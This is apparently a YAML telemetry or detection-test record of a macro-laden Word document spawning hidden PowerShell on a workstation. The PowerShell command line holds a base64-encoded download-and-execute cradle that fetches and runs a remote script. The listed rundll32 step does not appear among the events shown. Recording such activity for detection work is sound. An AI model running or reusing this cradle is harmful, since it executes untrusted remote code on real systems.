  system: WS-ZADAMS-01
  activity: Macro launches encoded PowerShell cradle and rundll32
  events:
  - type: process
    process_ref: word
    process_name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
    command_line: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\zoe.adams\Downloads\Statement.docm"'
  - type: process
    process_ref: ps
    parent_ref: word
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcwB1AG4AcgBpAGQAZwBlAC0AaQB0AC8AdABvAG8AbABzAC8AbQBhAGkAbgAvAHUALgBwAHMAMQAnACkA
